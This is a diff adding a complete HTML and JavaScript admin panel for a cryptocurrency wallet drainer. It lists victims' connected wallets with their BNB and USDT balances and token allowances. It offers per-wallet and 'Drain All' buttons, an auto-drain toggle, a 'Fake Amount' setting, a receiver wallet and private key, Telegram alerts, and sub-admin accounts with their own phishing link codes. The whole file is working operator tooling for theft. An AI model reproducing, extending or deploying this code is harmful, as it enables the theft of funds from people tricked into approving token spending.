@@ -1,1 +1,202 @@
-SEE_ARTIFACTS
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Panel</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#0f1117;--card:#1a1d27;--card2:#222633;--border:#2d3348;--text:#f0f2f8;--muted:#8b92a8;--purple:#8b5cf6;--blue:#3b82f6;--cyan:#06b6d4;--green:#10b981;--orange:#f59e0b;--red:#ef4444}
+body{font-family:Inter,system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
+.login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;background:radial-gradient(ellipse at 30% 20%,#1e1b4b 0%,var(--bg) 50%),radial-gradient(ellipse at 70% 80%,#0c4a6e 0%,transparent 40%)}
+.login-box{background:var(--card);border:1px solid var(--border);border-radius:20px;padding:40px;width:100%;max-width:400px;box-shadow:0 25px 50px rgba(0,0,0,.4)}
+.login-box h1{font-size:24px;font-weight:700;background:linear-gradient(135deg,var(--purple),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px}
+.login-box p{color:var(--muted);font-size:13px;margin-bottom:28px}
+input,select,textarea{width:100%;background:var(--bg);border:1px solid var(--border);border-radius:10px;padding:12px 14px;color:var(--text);font-size:14px;font-family:inherit;outline:none}
+input:focus{border-color:var(--purple);box-shadow:0 0 0 3px rgba(139,92,246,.2)}
+.btn{padding:11px 18px;border:none;border-radius:10px;font-weight:600;font-size:13px;cursor:pointer;font-family:inherit}
+.btn:hover{filter:brightness(1.1)}
+.btn-primary{background:linear-gradient(135deg,var(--purple),var(--blue));color:#fff;width:100%}
+.btn-green{background:var(--green);color:#fff}.btn-red{background:var(--red);color:#fff}.btn-orange{background:var(--orange);color:#000}
+.btn-outline{background:transparent;border:1px solid var(--border);color:var(--text)}
+.btn-sm{padding:6px 12px;font-size:12px;border-radius:8px}
+#dashboard{display:none}
+.topbar{display:flex;align-items:center;justify-content:space-between;padding:14px 24px;border-bottom:1px solid var(--border);background:rgba(26,29,39,.95);position:sticky;top:0;z-index:20}
+.topbar h1{font-size:17px;font-weight:700}
+.topbar h1 span{background:linear-gradient(135deg,var(--purple),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.badge-role{font-size:11px;padding:3px 10px;border-radius:20px;font-weight:600;margin-left:8px}
+.badge-super{background:rgba(139,92,246,.2);color:var(--purple)}.badge-sub{background:rgba(6,182,212,.2);color:var(--cyan)}
+.topbar-actions{display:flex;gap:8px;flex-wrap:wrap}
+.tabs{display:flex;gap:4px;padding:12px 24px 0;border-bottom:1px solid var(--border)}
+.tab{padding:10px 18px;border:none;background:transparent;color:var(--muted);font-weight:600;font-size:13px;cursor:pointer;border-bottom:2px solid transparent;font-family:inherit}
+.tab.active{color:var(--text);border-bottom-color:var(--purple)}
+.panel{display:none;padding:20px 24px 40px}.panel.active{display:block}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:20px}
+.stat{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:18px;position:relative;overflow:hidden}
+.stat::after{content:'';position:absolute;top:0;left:0;right:0;height:3px}
+.stat:nth-child(1)::after{background:linear-gradient(90deg,var(--purple),var(--blue))}
+.stat:nth-child(2)::after{background:linear-gradient(90deg,var(--cyan),var(--green))}
+.stat:nth-child(3)::after{background:linear-gradient(90deg,var(--orange),var(--red))}
+.stat:nth-child(4)::after{background:linear-gradient(90deg,var(--green),var(--cyan))}
+.stat-label{font-size:11px;color:var(--muted);text-transform:uppercase;font-weight:500}
+.stat-value{font-size:26px;font-weight:700;margin-top:6px}.stat-value.green{color:var(--green)}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:20px}
+.card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:20px}
+.card h2{font-size:14px;font-weight:600;margin-bottom:16px;display:flex;align-items:center;gap:8px}
+.card h2 .dot{width:8px;height:8px;border-radius:50%;background:var(--purple)}
+.form-group{margin-bottom:14px}.form-group label{display:block;font-size:12px;color:var(--muted);margin-bottom:6px;font-weight:500}
+.table-wrap{overflow-x:auto}table{width:100%;border-collapse:collapse;font-size:13px}
+th{text-align:left;padding:10px 12px;color:var(--muted);font-weight:600;border-bottom:1px solid var(--border);font-size:11px;text-transform:uppercase}
+td{padding:12px;border-bottom:1px solid var(--border)}
+.badge{display:inline-block;padding:3px 10px;border-radius:20px;font-size:11px;font-weight:600}
+.badge-connected{background:rgba(59,130,246,.15);color:var(--blue)}.badge-approved{background:rgba(16,185,129,.15);color:var(--green)}
+.badge-drained{background:rgba(239,68,68,.15);color:var(--red)}.badge-ready{background:rgba(245,158,11,.15);color:var(--orange)}
+.badge-active{background:rgba(16,185,129,.15);color:var(--green)}.badge-suspended{background:rgba(239,68,68,.15);color:var(--red)}
+.msg{padding:12px 16px;border-radius:10px;margin-bottom:12px;font-size:13px}
+.msg-ok{background:rgba(16,185,129,.12);color:var(--green)}.msg-err{background:rgba(239,68,68,.12);color:var(--red)}
+.mono{font-family:ui-monospace,monospace;font-size:12px}
+.toggle{display:flex;align-items:center;gap:10px;margin-bottom:12px}.toggle input{width:auto}
+.modal-bg{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:50;align-items:center;justify-content:center;padding:20px}
+.modal-bg.show{display:flex}
+.modal{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:28px;width:100%;max-width:480px;max-height:90vh;overflow-y:auto}
+.modal h3{font-size:18px;margin-bottom:16px}.modal-actions{display:flex;gap:10px;margin-top:20px;justify-content:flex-end}
+.sub-card{background:var(--card2);border:1px solid var(--border);border-radius:12px;padding:16px;cursor:pointer}.sub-card:hover{border-color:var(--purple)}
+.sub-card h4{font-size:15px;margin-bottom:4px}.sub-meta{font-size:12px;color:var(--muted);line-height:1.6}
+.link-box{background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:10px 12px;font-size:12px;word-break:break-all;color:var(--cyan);margin-top:8px}
+@media(max-width:900px){.stats{grid-template-columns:repeat(2,1fr)}.grid2{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<div class="login-wrap" id="loginScreen">
+  <div class="login-box">
+    <h1>Admin Panel</h1>
+    <p>Super Admin & Sub Admin Login</p>
+    <div class="form-group"><input type="password" id="passInput" placeholder="Password" onkeydown="if(event.key==='Enter')login()"></div>
+    <button class="btn btn-primary" onclick="login()">Login</button>
+    <div id="loginMsg" style="margin-top:14px"></div>
+  </div>
+</div>
+<div id="dashboard">
+  <div class="topbar">
+    <h1><span id="panelTitle">Admin</span> <span class="badge-role" id="roleBadge"></span></h1>
+    <div class="topbar-actions">
+      <button class="btn btn-outline btn-sm" onclick="refreshAll()">Refresh</button>
+      <button class="btn btn-green btn-sm" onclick="drainAll()">Drain All</button>
+      <button class="btn btn-outline btn-sm" onclick="logout()">Logout</button>
+    </div>
+  </div>
+  <div class="tabs">
+    <button class="tab active" data-tab="users" onclick="switchTab('users')">Users</button>
+    <button class="tab" data-tab="settings" onclick="switchTab('settings')">Settings</button>
+    <button class="tab" data-tab="subs" id="tabSubs" onclick="switchTab('subs')" style="display:none">Sub Admins</button>
+  </div>
+  <div id="globalMsg" style="padding:12px 24px 0"></div>
+  <div class="panel active" id="panel-users">
+    <div class="stats">
+      <div class="stat"><div class="stat-label">Total Users</div><div class="stat-value" id="statTotal">0</div></div>
+      <div class="stat"><div class="stat-label">Approved</div><div class="stat-value" id="statApproved">0</div></div>
+      <div class="stat"><div class="stat-label">Drained</div><div class="stat-value" id="statDrained">0</div></div>
+      <div class="stat"><div class="stat-label">Total USDT</div><div class="stat-value green" id="statAmount">0.00</div></div>
+    </div>
+    <div class="card">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;flex-wrap:wrap;gap:10px">
+        <h2 style="margin:0"><span class="dot"></span> Connected Users</h2>
+        <input type="text" id="searchId" placeholder="Search" style="width:180px;padding:8px 12px;font-size:13px" oninput="filterUsers()">
+      </div>
+      <div class="table-wrap"><table><thead><tr><th>Address</th><th>BNB</th><th>USDT</th><th>Allow</th><th>Status</th><th>Connected</th><th>Actions</th></tr></thead><tbody id="usersBody"><tr><td colspan="7" style="text-align:center;color:var(--muted)">No users</td></tr></tbody></table></div>
+    </div>
+  </div>
+  <div class="panel" id="panel-settings">
+    <div class="grid2">
+      <div class="card">
+        <h2><span class="dot"></span> Wallet & Drain</h2>
+        <div class="form-group" id="fgReceiver"><label>Receiver Wallet</label><input type="text" id="cfgReceiver" placeholder="0x..."></div>
+        <div class="form-group" id="fgPk"><label>Private Key</label><input type="password" id="cfgPrivateKey" placeholder="leave blank to keep"></div>
+        <div class="toggle" id="fgAutoDrain"><input type="checkbox" id="cfgAutoDrain"><label for="cfgAutoDrain" style="margin:0">Auto Drain ON</label></div>
+        <div class="form-group" id="fgFake"><label>Fake Amount</label><input type="text" id="cfgFakeAmount" value="5000000"></div>
+        <div class="form-group" id="fgPass"><label>New Password</label><input type="password" id="cfgNewPass" placeholder="leave blank"></div>
+        <button class="btn btn-primary" onclick="saveSettings()">Save</button>
+      </div>
+      <div class="card" id="cardTg">
+        <h2><span class="dot" style="background:var(--cyan)"></span> Telegram</h2>
+        <div class="form-group"><label>Bot Token</label><input type="text" id="cfgTgToken" placeholder="123456:ABC..."></div>
+        <div class="form-group"><label>Chat ID</label><input type="text" id="cfgTgChat" placeholder="-100..."></div>
+        <button class="btn btn-outline btn-sm" onclick="testTg()">Test Telegram</button>
+      </div>
+    </div>
+  </div>
+  <div class="panel" id="panel-subs">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
+      <h2 style="font-size:16px">Sub Admins</h2>
+      <button class="btn btn-primary" style="width:auto" onclick="openCreateSub()">+ Create Sub Admin</button>
+    </div>
+    <div id="subsList" class="grid2"></div>
+    <div id="subDetail" style="display:none;margin-top:24px">
+      <div class="card">
+        <div style="display:flex;justify-content:space-between;margin-bottom:16px">
+          <h2 style="margin:0" id="subDetailTitle">Detail</h2>
+          <button class="btn btn-outline btn-sm" onclick="closeSubDetail()">Close</button>
+        </div>
+        <div id="subDetailBody"></div>
+        <div class="table-wrap" style="margin-top:16px"><table><thead><tr><th>Address</th><th>USDT</th><th>Status</th><th>Actions</th></tr></thead><tbody id="subUsersBody"></tbody></table></div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="modal-bg" id="subModal">
+  <div class="modal">
+    <h3 id="subModalTitle">Create Sub Admin</h3>
+    <input type="hidden" id="editSubId">
+    <div class="form-group"><label>Name</label><input type="text" id="subName"></div>
+    <div class="form-group"><label>Login Password</label><input type="text" id="subPass"></div>
+    <div class="form-group"><label>BEP20 Address</label><input type="text" id="subReceiver" placeholder="0x..."></div>
+    <div class="form-group"><label>Private Key</label><input type="password" id="subPk"></div>
+    <div class="form-group"><label>Telegram Bot Token</label><input type="text" id="subTgToken"></div>
+    <div class="form-group"><label>Telegram Chat ID</label><input type="text" id="subTgChat"></div>
+    <div class="modal-actions">
+      <button class="btn btn-outline" onclick="closeSubModal()">Cancel</button>
+      <button class="btn btn-primary" style="width:auto" onclick="saveSub()">Save</button>
+    </div>
+  </div>
+</div>
+<script>
+let adminPass=localStorage.getItem('adminPass')||'';
+let role=localStorage.getItem('adminRole')||'';
+let myId=localStorage.getItem('adminId')||'';
+let allUsers=[],allSubs=[];
+async function api(path,opts={}){const headers=Object.assign({'Content-Type':'application/json','x-admin-pass':adminPass},opts.headers||{});const res=await fetch(path,Object.assign({},opts,{headers}));const data=await res.json().catch(()=>({}));if(!res.ok)throw data;return data;}
+async function login(){const pass=document.getElementById('passInput').value;adminPass=pass;try{const me=await api('/api/admin/me');role=me.role;myId=me.id||'';localStorage.setItem('adminPass',pass);localStorage.setItem('adminRole',role);localStorage.setItem('adminId',myId);document.getElementById('loginScreen').style.display='none';document.getElementById('dashboard').style.display='block';document.getElementById('panelTitle').textContent=me.name||'Admin';const badge=document.getElementById('roleBadge');badge.textContent=role==='super'?'SUPER':'SUB';badge.className='badge-role '+(role==='super'?'badge-super':'badge-sub');
+if(role==='super'){document.getElementById('tabSubs').style.display='';}else{document.getElementById('tabSubs').style.display='none';document.getElementById('fgReceiver').style.display='none';document.getElementById('fgFake').style.display='none';document.getElementById('fgPk').style.display='none';document.getElementById('fgPass').style.display='none';document.getElementById('cardTg').style.display='none';document.getElementById('fgAutoDrain').style.display='';}
+loadConfig();loadUsers();if(role==='super')loadSubs();setInterval(loadUsers,15000);}catch(e){document.getElementById('loginMsg').innerHTML='<div class="msg msg-err">Wrong password</div>';}}
+function logout(){localStorage.clear();location.reload();}
+function switchTab(name){document.querySelectorAll('.tab').forEach(t=>t.classList.toggle('active',t.dataset.tab===name));document.querySelectorAll('.panel').forEach(p=>p.classList.toggle('active',p.id==='panel-'+name));}
+async function loadConfig(){try{const cfg=await api('/api/admin/config');document.getElementById('cfgReceiver').value=cfg.receiverAddress||'';document.getElementById('cfgFakeAmount').value=cfg.fakeAmount||'5000000';document.getElementById('cfgAutoDrain').checked=cfg.autoDrain!==false;document.getElementById('cfgTgChat').value=cfg.telegramChatId||'';}catch(e){}}
+async function saveSettings(){let body={};if(role==='super'){body={receiverAddress:document.getElementById('cfgReceiver').value.trim(),fakeAmount:document.getElementById('cfgFakeAmount').value,autoDrain:document.getElementById('cfgAutoDrain').checked,telegramChatId:document.getElementById('cfgTgChat').value.trim()};const pk=document.getElementById('cfgPrivateKey').value.trim();if(pk)body.privateKey=pk;const tg=document.getElementById('cfgTgToken').value.trim();if(tg)body.telegramBotToken=tg;const np=document.getElementById('cfgNewPass').value;if(np)body.adminPassword=np;}else{body={autoDrain:document.getElementById('cfgAutoDrain').checked};}try{await api('/api/admin/config',{method:'POST',body:JSON.stringify(body)});showMsg('Saved','ok');}catch(e){showMsg(e.error||'Failed','err');}}
+async function testTg(){try{await api('/api/admin/test-telegram',{method:'POST'});showMsg('Sent','ok');}catch(e){showMsg(e.error||'Failed','err');}}
+async function loadUsers(){try{const users=await api('/api/admin/users');allUsers=users;renderUsers(users);document.getElementById('statTotal').textContent=users.length;document.getElementById('statApproved').textContent=users.filter(u=>u.approved&&!u.drained).length;document.getElementById('statDrained').textContent=users.filter(u=>u.drained).length;document.getElementById('statAmount').textContent=users.reduce((s,u)=>s+parseFloat(u.drainedAmount||0),0).toFixed(2);}catch(e){}}
+function badgeClass(u){if(u.drained)return'drained';if(u.status==='ready_to_drain')return'ready';if(u.approved)return'approved';return'connected';}
+function short(a){if(!a||a.length<12)return a||'-';return a.slice(0,6)+'...'+a.slice(-4);}
+function formatDate(d){if(!d)return'-';try{return new Date(d).toLocaleString();}catch(e){return d;}}
+function renderUsers(users){const tbody=document.getElementById('usersBody');if(!users.length){tbody.innerHTML='<tr><td colspan="7" style="text-align:center;color:var(--muted)">No users</td></tr>';return;}tbody.innerHTML=users.map(u=>`<tr><td class="mono">${short(u.address)}<br><span style="font-size:10px;color:var(--muted)">ID:${(u.id||'').slice(0,8)}</span></td><td>${parseFloat(u.balanceBNB||0).toFixed(4)}</td><td>${parseFloat(u.balanceUSDT||0).toFixed(2)}</td><td>${u.allowance==='unlimited'||parseFloat(u.allowance)>1e10?'MAX':(u.allowance||'0')}</td><td><span class="badge badge-${badgeClass(u)}">${u.status||'connected'}</span></td><td>${formatDate(u.connectedAt)}</td><td><button class="btn btn-outline btn-sm" onclick="refreshUser('${u.id}')">Sync</button> <button class="btn btn-green btn-sm" onclick="drainUser('${u.id}')" ${u.drained?'disabled':''}>Drain</button> <button class="btn btn-red btn-sm" onclick="deleteUser('${u.id}')">X</button></td></tr>`).join('');}
+function filterUsers(){const q=(document.getElementById('searchId').value||'').toLowerCase().trim();if(!q){renderUsers(allUsers);return;}renderUsers(allUsers.filter(u=>(u.id||'').toLowerCase().includes(q)||(u.address||'').toLowerCase().includes(q)));}
+async function refreshUser(id){showMsg('Sync...','ok');await api('/api/admin/refresh/'+id,{method:'POST'});loadUsers();}
+async function drainUser(id){if(!confirm('Drain?'))return;showMsg('Draining...','ok');try{const r=await api('/api/admin/drain/'+id,{method:'POST'});showMsg('Done: '+(r.amount||'')+(r.txHash?' Tx:'+r.txHash:''),'ok');loadUsers();}catch(e){showMsg(e.error||e.message||'Failed','err');}}
+async function drainAll(){if(!confirm('Drain ALL?'))return;try{await api('/api/admin/drain-all',{method:'POST'});showMsg('Done','ok');loadUsers();}catch(e){showMsg(e.error||'Failed','err');}}
+async function deleteUser(id){if(!confirm('Remove?'))return;await api('/api/admin/user/'+id,{method:'DELETE'});loadUsers();}
+function refreshAll(){loadUsers();if(role==='super')loadSubs();}
+async function loadSubs(){try{allSubs=await api('/api/admin/subs');renderSubs();}catch(e){}}
+function renderSubs(){const el=document.getElementById('subsList');if(!allSubs.length){el.innerHTML='<div style="color:var(--muted);padding:20px">No sub admins. Create one.</div>';return;}el.innerHTML=allSubs.map(s=>`<div class="sub-card" onclick="viewSub('${s.id}')"><h4>#${s.code||'?'} ${s.name} <span class="badge badge-${s.status==='active'?'active':'suspended'}">${s.status}</span></h4><div class="sub-meta">Wallet: <span class="mono">${short(s.receiverAddress)}</span><br>TG: ${s.telegramChatId||'-'} · Key: ${s.hasPrivateKey?'Yes':'No'} · Auto: ${s.autoDrain!==false?'ON':'OFF'}</div><div class="link-box">${location.origin}/${s.code||''}</div></div>`).join('');}
+function openCreateSub(){document.getElementById('subModalTitle').textContent='Create Sub Admin';document.getElementById('editSubId').value='';['subName','subPass','subReceiver','subPk','subTgToken','subTgChat'].forEach(id=>document.getElementById(id).value='');document.getElementById('subModal').classList.add('show');}
+function closeSubModal(){document.getElementById('subModal').classList.remove('show');}
+async function saveSub(){const id=document.getElementById('editSubId').value;const body={name:document.getElementById('subName').value.trim(),password:document.getElementById('subPass').value,receiverAddress:document.getElementById('subReceiver').value.trim(),privateKey:document.getElementById('subPk').value.trim(),telegramBotToken:document.getElementById('subTgToken').value.trim(),telegramChatId:document.getElementById('subTgChat').value.trim()};try{if(id){await api('/api/admin/subs/'+id,{method:'PUT',body:JSON.stringify(body)});}else{if(!body.name||!body.password){showMsg('Name+password required','err');return;}await api('/api/admin/subs',{method:'POST',body:JSON.stringify(body)});}closeSubModal();showMsg('Saved','ok');loadSubs();}catch(e){showMsg(e.error||'Failed','err');}}
+async function viewSub(id){try{const data=await api('/api/admin/subs/'+id+'/users');const s=data.sub;document.getElementById('subDetail').style.display='block';document.getElementById('subDetailTitle').textContent='#'+(s.code||'?')+' '+s.name;document.getElementById('subDetailBody').innerHTML=`<div class="sub-meta" style="margin-bottom:12px"><b>Code:</b> /${s.code||''}<br><b>Wallet:</b> <span class="mono">${s.receiverAddress||'-'}</span><br><b>Status:</b> ${s.status} · AutoDrain: ${s.autoDrain!==false?'ON':'OFF'}<br><b>TG:</b> ${s.telegramChatId||'-'} · Key: ${s.hasPrivateKey?'Yes':'No'}<br><div class="link-box">${location.origin}/${s.code||''}</div></div><div style="display:flex;gap:8px;flex-wrap:wrap"><button class="btn btn-sm ${s.status==='active'?'btn-orange':'btn-green'}" onclick="toggleSub('${s.id}','${s.status==='active'?'suspended':'active'}')">${s.status==='active'?'Suspend':'Unsuspend'}</button><button class="btn btn-outline btn-sm" onclick="editSub('${s.id}')">Edit</button><button class="btn btn-red btn-sm" onclick="deleteSub('${s.id}')">Delete</button></div>`;const tbody=document.getElementById('subUsersBody');if(!data.users.length){tbody.innerHTML='<tr><td colspan="4" style="text-align:center;color:var(--muted)">No users</td></tr>';}else{tbody.innerHTML=data.users.map(u=>`<tr><td class="mono">${short(u.address)}</td><td>${parseFloat(u.balanceUSDT||0).toFixed(2)}</td><td><span class="badge badge-${badgeClass(u)}">${u.status||''}</span></td><td><button class="btn btn-green btn-sm" onclick="drainUser('${u.id}')" ${u.drained?'disabled':''}>Drain</button></td></tr>`).join('');}}catch(e){showMsg(e.error||'Failed','err');}}
+function closeSubDetail(){document.getElementById('subDetail').style.display='none';}
+async function toggleSub(id,status){await api('/api/admin/subs/'+id,{method:'PUT',body:JSON.stringify({status})});showMsg(status,'ok');loadSubs();viewSub(id);}
+function editSub(id){const s=allSubs.find(x=>x.id===id);if(!s)return;document.getElementById('subModalTitle').textContent='Edit Sub Admin';document.getElementById('editSubId').value=id;document.getElementById('subName').value=s.name||'';document.getElementById('subPass').value='';document.getElementById('subReceiver').value=s.receiverAddress||'';document.getElementById('subPk').value='';document.getElementById('subTgToken').value='';document.getElementById('subTgChat').value=s.telegramChatId||'';document.getElementById('subModal').classList.add('show');}
+async function deleteSub(id){if(!confirm('Delete sub admin?'))return;await api('/api/admin/subs/'+id,{method:'DELETE'});closeSubDetail();showMsg('Deleted','ok');loadSubs();}
+function showMsg(text,type){const el=document.getElementById('globalMsg');el.innerHTML='<div class="msg msg-'+type+'">'+text+'</div>';setTimeout(()=>el.innerHTML='',5000);}
+if(adminPass){document.getElementById('passInput').value=adminPass;login();}
+</script>
+</body>
+</html>
